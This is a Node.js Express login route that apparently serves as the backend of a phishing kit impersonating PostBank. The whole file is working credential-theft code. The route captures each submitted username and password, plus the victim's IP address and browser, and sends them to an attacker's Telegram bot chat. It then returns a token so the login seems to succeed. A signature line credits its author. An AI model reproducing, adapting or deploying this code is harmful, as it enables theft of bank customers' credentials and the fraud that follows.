const express = require('express')
const geoip = require('geoip-lite')
const jwt = require('jsonwebtoken')

const login =express.Router()
const axios =require('axios')
const {protect} = require("../middleware/authMiddleware");
require('dotenv').config()

const { TOKEN , ChatID } = process.env
const Telegram_api=`https://api.telegram.org/bot${TOKEN}`
const generateToken = (id) => {
    return jwt.sign({ id }, process.env.JWT_SECRET, {
        expiresIn: '30d',
    })
}

login.post('/',(req,res)=>{
    const geo = geoip.lookup(req.ip);
    const log= "---------- ☺ Login PostBank ☺ ----------- \n" +
        "Username : " +req.body.username +"\n"+
        "Password : "+ req.body.password +"\n"+
        "------------------------------------- \n"+
        "Browser : " +req.headers["user-agent"]+"\n"+
        "Ip Address  :"+req.ip+"\n"+
        "----------Created By ChkawPaolo ----------- \n"
    const rs = axios.post(`${Telegram_api}/sendMessage`, {
        chat_id: ChatID,
        text: log
    })
    res.status(200).json({
        'jwt':generateToken(req.body.username)
    })

})
module.exports = login
